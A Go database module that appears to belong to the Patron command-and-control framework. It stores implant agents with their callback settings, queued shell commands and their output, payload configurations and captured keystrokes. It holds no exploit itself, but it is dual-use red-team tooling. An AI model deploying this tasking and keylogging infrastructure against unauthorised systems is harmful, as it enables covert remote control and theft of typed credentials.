package data

import (
	"database/sql"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/PatronC2/Patron/helper"
	"github.com/PatronC2/Patron/types"	
	"github.com/PatronC2/Patron/lib/logger"	
	_ "github.com/lib/pq"
)

var db *sql.DB

func OpenDatabase(){ 
	var err error

    host := os.Getenv("DB_HOST")
    port := os.Getenv("DB_PORT")
    user := os.Getenv("DB_USER")
    password := os.Getenv("DB_PASS")
    dbname := os.Getenv("DB_NAME")

	logger.Logf(logger.Info, "Connecting to database %s\n", host)

	psqlInfo := fmt.Sprintf("host=%s port=%s user=%s "+
    "password=%s dbname=%s sslmode=disable",
    host, port, user, password, dbname)
	for {

		db, err = sql.Open("postgres", psqlInfo)
		if err != nil {
			logger.Logf(logger.Error, "Failed to connect to the database: %v\n", err)
			time.Sleep(30 * time.Second)
			continue
		}
		err = db.Ping()
		if err != nil {
			logger.Logf(logger.Error, "Failed to ping the database: %v\n", err)
			db.Close()
			time.Sleep(30 * time.Second)
			continue
		}
		logger.Logf(logger.Info, "Postgres DB connected\n")
		break
	}
}

func InitDatabase() {

	AgentSQL := `
	CREATE TABLE IF NOT EXISTS "Agents" (
		"AgentID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL UNIQUE,
		"Status" TEXT NOT NULL DEFAULT 'Online',
		"CallBackToIP" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackFeq" TEXT NOT NULL DEFAULT 'Unknown',
		"CallBackJitter" TEXT NOT NULL DEFAULT 'Unknown',
		"Ip" TEXT NOT NULL DEFAULT 'Unknown',
		"User" TEXT NOT NULL DEFAULT 'Unknown',
		"Hostname" TEXT NOT NULL DEFAULT 'Unknown',
		"isDeleted" INTEGER NOT NULL DEFAULT 0,
		"LastCallBack" INTEGER NOT NULL DEFAULT 0
	);
	`
	_, err := db.Exec(AgentSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Agents table initialized\n")

	CommandSQL := `
	CREATE TABLE IF NOT EXISTS "Commands" (
		"CommandID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Result" TEXT,
		"CommandType" TEXT,
		"Command" TEXT,
		"CommandUUID" TEXT,
		"Output" TEXT DEFAULT 'Pending',
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
	);
	`
	_, err = db.Exec(CommandSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Commands table initialized\n")

	KeylogSQL := `
	CREATE TABLE IF NOT EXISTS "Keylog" (
		"KeylogID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Keys" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
	);
	`
	_, err = db.Exec(KeylogSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Keylog table initialized\n")

	PayloadSQL := `
	CREATE TABLE IF NOT EXISTS "Payloads" (
		"PayloadID" SERIAL PRIMARY KEY,
		"UUID" TEXT,
		"Name" TEXT,
		"Description" TEXT,
		"ServerIP" TEXT,
		"ServerPort" TEXT,
		"CallbackFrequency" TEXT,
		"CallbackJitter" TEXT,
		"Concat" TEXT,
		"isDeleted" INTEGER NOT NULL DEFAULT 0
	);
	`
	_, err = db.Exec(PayloadSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Payloads table initialized\n")

    UsersSQL := `
	CREATE TABLE IF NOT EXISTS users (
		id SERIAL PRIMARY KEY,
		username VARCHAR(50) UNIQUE NOT NULL,
		password_hash TEXT NOT NULL,
		role VARCHAR(20) NOT NULL CHECK (role IN ('admin', 'operator', 'readOnly'))
	);
	`
    _, err = db.Exec(UsersSQL)
    if err != nil {
        log.Fatal(err.Error())
    }
    logger.Logf(logger.Info, "Users table initialized")

	NotesSQL := `
	CREATE TABLE IF NOT EXISTS "notes" (
		"NoteID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL,
		"Note" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID"),
		UNIQUE ("UUID")
	);
	`
	_, err = db.Exec(NotesSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "Notes table initialized\n")

	TagsSQL := `
	CREATE TABLE IF NOT EXISTS "tags" (
		"TagID" SERIAL PRIMARY KEY,
		"UUID" TEXT NOT NULL,
		"Key" TEXT NOT NULL,
		"Value" TEXT,
		FOREIGN KEY ("UUID") REFERENCES "Agents" ("UUID")
	);
	`
	_, err = db.Exec(TagsSQL)
	if err != nil {
		log.Fatal(err.Error())
	}
	logger.Logf(logger.Info, "tags table initialized\n")

}

func CreateAgent(uuid string, CallBackToIP string, CallBackFeq string, CallBackJitter string, Ip string, User string, Hostname string) {
	CreateAgentSQL := `INSERT INTO "Agents" ("UUID", "CallBackToIP", "CallBackFeq", "CallBackJitter", "Ip", "User", "Hostname")
VALUES ($1, $2, $3, $4, $5, $6, $7)`

	statement, err := db.Prepare(CreateAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, CallBackToIP, CallBackFeq, CallBackJitter, Ip, User, Hostname)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Agent created in DB\n")
}

func CreateKeys(uuid string) {
	CreateKeysSQL := `INSERT INTO "Keylog" ("UUID", "Keys")
	VALUES ($1, $2)`

	statement, err := db.Prepare(CreateKeysSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, "")
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Keylog Agent created in DB\n")
}

func CreatePayload(uuid string, name string, description string, ServerIP string, ServerPort string, CallBackFeq string, CallBackJitter string, Concat string) {
	CreateAgentSQL := `INSERT INTO "Payloads" ("UUID", "Name", "Description", "ServerIP", "ServerPort", "CallbackFrequency", "CallbackJitter", "Concat")
	VALUES ($1, $2, $3, $4, $5, $6, $7, $8)`

	statement, err := db.Prepare(CreateAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, name, description, ServerIP, ServerPort, CallBackFeq, CallBackJitter, Concat)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "New Payload created in DB\n")
}

func FetchOneAgent(uuid string) (info types.ConfigAgent, err error ) {
	FetchSQL := `
	SELECT 
		"UUID",
		"CallBackToIP",
		"CallBackFeq",
		"CallBackJitter",
		"Status",
		"Ip",
		"User",
		"Hostname"
	FROM "Agents" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		err := row.Scan(
			&info.Uuid,
			&info.CallbackTo,
			&info.CallbackFrequency,
			&info.CallbackJitter,
			&info.Status,
			&info.AgentIP,
			&info.Username,
			&info.Hostname,
		)
		switch err {
		case sql.ErrNoRows:
			logger.Logf(logger.Info, "No rows were returned!! \n")
			return info, err
		case nil:
			logger.Logf(logger.Info, "%v\n", info)
		default:
			panic(err)
		}
	}

	logger.Logf(logger.Info, "Agent %s Fetched \n", info.Uuid)
	return info, err
}

func FetchNextCommand(uuid string) types.GiveAgentCommand {
	var info types.GiveAgentCommand
	FetchSQL := `
	SELECT 
		"Commands"."UUID", 
		"Agents"."CallBackToIP", 
		"Agents"."CallBackFeq", 
		"Agents"."CallBackJitter", 
		"Commands"."CommandType", 
		"Commands"."Command", 
		"Commands"."CommandUUID"
	FROM "Commands" INNER JOIN 
		"Agents" ON "Commands"."UUID" = "Agents"."UUID" 
	WHERE "Commands"."UUID"=$1 AND "Commands"."Result"='0' LIMIT 1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		err := row.Scan(
			&info.UpdateAgentConfig.Uuid,
			&info.UpdateAgentConfig.CallbackTo,
			&info.UpdateAgentConfig.CallbackFrequency,
			&info.UpdateAgentConfig.CallbackJitter,
			&info.CommandType,
			&info.Command,
			&info.CommandUUID,
			// &info.Binary,
		)
		switch err {
		case sql.ErrNoRows:
			logger.Logf(logger.Info, "No rows were returned!! \n")
			return info
		case nil:
			logger.Logf(logger.Info, "%v\n", info)
		default:
			panic(err)
		}
	}

	logger.Logf(logger.Info, "Agent %s Fetched Next Command %s \n", info.UpdateAgentConfig.Uuid, info.Command)
	return info
}
func SendAgentCommand(uuid string, result string, CommandType string, Command string, CommandUUID string) {
	SendAgentCommandSQL := `INSERT INTO "Commands" ("UUID", "Result", "CommandType", "Command", "CommandUUID")
	VALUES ($1, $2, $3, $4, $5)`

	statement, err := db.Prepare(SendAgentCommandSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(uuid, result, CommandType, Command, CommandUUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived New Command \n", uuid)
}

func UpdateAgentConfig(UUID string, CallbackServer string, CallbackFrequency string, CallbackJitter string) {
	updateAgentConfigSQL := `UPDATE "Agents" SET "CallBackToIP"= $1, "CallBackFeq"= $2, "CallBackJitter"= $3 WHERE "UUID"= $4`

	statement, err := db.Prepare(updateAgentConfigSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(CallbackServer, CallbackFrequency, CallbackJitter, UUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived Config Update  \n", UUID)
}

func UpdateAgentCheckIn(UUID string, LastCallBack int64) {
	updateAgentCheckInSQL := `UPDATE "Agents" SET "LastCallBack"= $1 WHERE "UUID"= $2`

	statement, err := db.Prepare(updateAgentCheckInSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(LastCallBack, UUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Done, "Agent %s Check in Update  \n", UUID)
}

func UpdateAgentStatus() {
	updateAgentStatusSQL := `UPDATE "Agents"
	SET "Status" = CASE WHEN (EXTRACT(EPOCH FROM CURRENT_TIMESTAMP)  - "LastCallBack" > (2 * ("CallBackFeq"::numeric)))
		THEN 'Offline' ELSE 'Online' END
	WHERE "AgentID" IN (SELECT "AgentID" FROM "Agents");`

	statement, err := db.Prepare(updateAgentStatusSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec()
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent Status Updated\n")
}

func UpdateAgentCommand(CommandUUID string, Output string, uuid string) {
	updateAgentCommandSQL := `UPDATE "Commands" SET "Result"='1', "Output"= $1 WHERE "CommandUUID"= $2`

	statement, err := db.Prepare(updateAgentCommandSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(Output, CommandUUID)
	if err != nil {

		log.Fatalln(err)
	}
	logger.Logf(logger.Info, "Agent %s Reveived Output with CommandID %s \n", uuid, CommandUUID)
}

func UpdateAgentKeys(UUID string, Keys string) {
	updateAgentKeylogSQL := `UPDATE "Keylog" SET "Keys"="Keys" || $1 WHERE "UUID"= $2`

	statement, err := db.Prepare(updateAgentKeylogSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(Keys, UUID)
	if err != nil {

		log.Fatalln(err)
	}
}

func DeleteAgent(UUID string) {
	DeleteAgentSQL := `UPDATE "Agents" SET "isDeleted"=1 WHERE "UUID"= $1`

	statement, err := db.Prepare(DeleteAgentSQL)
	if err != nil {

		log.Fatalln(err)
		logger.Logf(logger.Info, "Error in DB\n")
	}

	_, err = statement.Exec(UUID)
	if err != nil {

		log.Fatalln(err)
	}
}

// WEB Functions

func Agents() (agentAppend []types.ConfigAgent, err error) {
	var agents types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID", 
		"CallBackToIP", 
		"CallBackFeq", 
		"CallBackJitter", 
		"Ip", 
		"User", 
		"Hostname",
		"Status"
	FROM "Agents"
	WHERE "isDeleted"='0'
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&agents.Uuid,
			&agents.CallbackTo,
			&agents.CallbackFrequency,
			&agents.CallbackJitter,
			&agents.AgentIP,
			&agents.Username,
			&agents.Hostname,
			&agents.Status,
		)
		agentAppend = append(agentAppend, agents)
	}
	return agentAppend, err
}

func AgentsByIp(Ip string) (agentAppend []types.ConfigAgent, err error) {
	var agents types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID", 
		"CallBackToIP", 
		"CallBackFeq", 
		"CallBackJitter", 
		"Ip", 
		"User", 
		"Hostname",
		"Status"
	FROM "Agents"
	WHERE "isDeleted"='0'
	AND "Ip" = $1
	`
	row, err := db.Query(FetchSQL, Ip)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&agents.Uuid,
			&agents.CallbackTo,
			&agents.CallbackFrequency,
			&agents.CallbackJitter,
			&agents.AgentIP,
			&agents.Username,
			&agents.Hostname,
			&agents.Status,
		)
		agentAppend = append(agentAppend, agents)
	}
	return agentAppend, err
}

func GroupAgentsByIp() (agentAppend []types.AgentIP, err error){
	var agents types.AgentIP
	FetchSQL := `
	SELECT DISTINCT "Ip" FROM "Agents"
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&agents.AgentIP,
		)
		agentAppend = append(agentAppend, agents)
	}
	return agentAppend, err
}

func Payloads() []types.Payload {
	var payloads types.Payload
	FetchSQL := `
	SELECT 
		"UUID", 
		"Name",
		"Description",
		"ServerIP", 
		"ServerPort", 
		"CallbackFrequency", 
		"CallbackJitter",
		"Concat" 
	FROM "Payloads"
	WHERE "isDeleted"='0'
	`
	row, err := db.Query(FetchSQL)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var payloadAppend []types.Payload
	for row.Next() {
		row.Scan(
			&payloads.Uuid,
			&payloads.Name,
			&payloads.Description,
			&payloads.ServerIP,
			&payloads.ServerPort,
			&payloads.CallbackFrequency,
			&payloads.CallbackJitter,
			&payloads.Concat,
		)
		payloadAppend = append(payloadAppend, payloads)
	}
	return payloadAppend
}

func GetAgentCommands(uuid string) (infoAppend []types.Agent, err error) {
	var info types.Agent
	FetchSQL := `
	SELECT 
		"UUID", 
		"CommandType", 
		"Command", 
		"CommandUUID", 
		"Output"
	FROM "Commands"
	WHERE "UUID"= $1 AND "CommandType" = 'shell'
	ORDER BY "CommandID" asc;
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.CommandType,
			&info.Command,
			&info.CommandUUID,
			&info.Output,
		)
		infoAppend = append(infoAppend, info)
	}

	return infoAppend, err
}

func Keylog(uuid string) []types.KeyReceive {
	var info types.KeyReceive
	FetchSQL := `
	SELECT 
		"UUID", 
		"Keys"
	FROM "Keylog"
	WHERE "UUID"= $1
	ORDER BY "KeylogID" asc;
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	var infoAppend []types.KeyReceive
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.Keys,
		)
		info.Keys = helper.FormatKeyLogs(info.Keys)
		infoAppend = append(infoAppend, info)
	}
	return infoAppend
}

func FetchOne(uuid string) (infoAppend []types.ConfigAgent, err error) {
	var info types.ConfigAgent
	FetchSQL := `
	SELECT 
		"UUID","CallBackToIP","CallBackFeq","CallBackJitter"
	FROM "Agents" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.Uuid,
			&info.CallbackTo,
			&info.CallbackFrequency,
			&info.CallbackJitter,
		)
	}
	infoAppend = append(infoAppend, info)
	logger.Logf(logger.Info, "%v\n", info)
	return infoAppend, err
}

func GetAgentNotes(uuid string) (infoAppend []types.Note, err error) {
	var info types.Note
	FetchSQL := `
	SELECT 
		"NoteID",
		"Note"
	FROM "notes" WHERE "UUID"=$1
	`
	row, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
	}
	defer row.Close()
	for row.Next() {
		row.Scan(
			&info.NoteID,
			&info.Note,
		)
	}
	infoAppend = append(infoAppend, info)
	logger.Logf(logger.Info, "%v\n", info)
	return infoAppend, err
}

func PutAgentNotes(uuid string, note string) error {
    UpsertSQL := `
    INSERT INTO "notes" ("UUID", "Note")
    VALUES ($1, $2)
    ON CONFLICT ("UUID")
    DO UPDATE SET "Note" = $2;
    `
    _, err := db.Exec(UpsertSQL, uuid, note)
    if err != nil {
        log.Fatalln(err)
        return err
    }
    logger.Logf(logger.Info, "Notes for UUID %v have been updated in DB\n", uuid)
    return nil
}

func GetAgentTags(uuid string) (infoAppend []types.Tag, err error) {
	var info types.Tag
	FetchSQL := `
	SELECT
		"TagID",
		"Key",
		"Value"
	FROM "tags" WHERE "UUID"=$1
	`
	rows, err := db.Query(FetchSQL, uuid)
	if err != nil {
		log.Fatal(err)
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		err := rows.Scan(
			&info.TagID,
			&info.Key,
			&info.Value,
		)
		if err != nil {
			log.Println("Error scanning row:", err)
			return nil, err
		}
		infoAppend = append(infoAppend, info)
	}

	if err := rows.Err(); err != nil {
		log.Println("Error iterating over rows:", err)
		return nil, err
	}

	logger.Logf(logger.Info, "Tags for %v: %+v\n", uuid, infoAppend)
	return infoAppend, nil
}


func PutAgentTags(uuid string, key string, value string) error {
    PutTagsSQL := `
    INSERT INTO "tags" ("UUID", "Key", "Value")
    VALUES ($1, $2, $3)
    `
    _, err := db.Exec(PutTagsSQL, uuid, key, value)
    if err != nil {
        log.Fatalln(err)
        return err
    }
    logger.Logf(logger.Info, "Tags for %v have been updated in DB\n", uuid)
    return nil
}
